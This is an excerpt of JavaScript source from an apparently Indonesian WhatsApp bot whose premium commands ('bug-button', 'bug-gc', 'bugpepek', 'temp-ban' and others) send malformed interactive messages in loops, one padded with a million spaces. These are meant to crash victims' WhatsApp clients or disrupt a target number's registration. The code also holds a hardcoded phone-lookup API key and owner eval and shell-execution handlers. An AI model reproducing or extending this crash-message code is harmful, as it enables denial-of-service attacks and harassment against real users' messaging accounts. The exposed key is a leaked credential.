if (!isPremium) return yoshreply(mess.premium)
if (!q) return yoshreply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return yoshreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
...
if (!isPremium) return yoshreply(mess.premium)
if (!q) return yoshreply(`Penggunaan .${command} 6287392784527|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
...
let ppk = jumlah * 1.5
m.reply(ppk + " detik");
yoshreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
await aipong(target)
await sleep(1500)
}
yoshreply(`👤 Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik`)
}
break
//=================================================//
case 'bug-button': case 'bug-browser': {
if (!isPremium) return yoshreply(mess.premium)
if (!q) return yoshreply(`Penggunaan .${command} https://chat.whatsapp.com/`)
yoshreply(mess.bugrespon)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await yoshcss.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
  ...
  "interactiveMessage": {
    ...
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'BUG WA V100 😂', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
...
await yoshcss.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
yoshreply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 5 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'bug-gc': case 'penghitaman': {
if (!isPremium) return yoshreply(mess.premium)
if (!q) return yoshreply(`Penggunaan .${command} 1962623836281@g.us`)
yoshreply(mess.bugrespon)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
...
//=================================================//
case 'temp-ban': {
if (!isPremium) return yoshreply(mess.prem)
if (!text) return yoshreply(`Example: ${prefix + command} 62|87872627288`)
if (!/|/.test(text)) return yoshreply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|87872627288`)
...
await yoshreply(`❗ Sukses! Gangguan Registrasi telah berhasil diaktifkan ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down Ⓜ️.`)
...
case 'cekprovider': {
if (!isPremium) return yoshreply(mess.prem)
if (!text) return yoshreply(`Example: ${prefix + command} 6287872627288`)
try {
var response = await fetch(`http://apilayer.net/api/validate?access_key=4a1ede76e87d9e64682b284e8620ad68&number=+${q}&country_code=&format=1`);
var result = await response.json();
yoshreply(JSON.stringify(result, null, 2));
...
} else yoshreply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else yoshreply('Masukkan nomor yang dituju!')
}
break
//=================================================//
case 'unbanv2': {
...
case 'bgtes': {
if (!isPremium) return yoshreply(mess.premium)
if (!q) return yoshreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
await yoshcss.sendVideoAsSticker(m.chat, mengkece, force, { packname: 'BUG WA V100 😂', author: 'PUKI' })
}
}
break
...
await yoshcss.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
await yoshreply('✅Succes')
}
break
//=================================================//
case 'bugpepek': {
...
await yoshcss.relayMessage(m.chat, etc.message, { participant: { jid: m.chat }, messageId: etc.key.id })
await sleep(700)
}
}
break
...
return yoshreply(bang)
}
try {
yoshreply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
yoshreply(String(e))
}
}
...
await yoshreply(evaled)
} catch (err) {
await yoshreply(String(err))
}
}
//=================================================//
if (budy.startsWith('$')) {
...
if (err) return yoshreply(`${err}`)
if (stdout) return yoshreply(`${stdout}`)
})
}
}
} catch (err) {
peki = async () => {
yoshcss.sendMessage(global.ownMain + '@s.whatsapp.net', {text: require('util').format(err)}, {quoted: m})
await sleep(1000)
m.reply(`
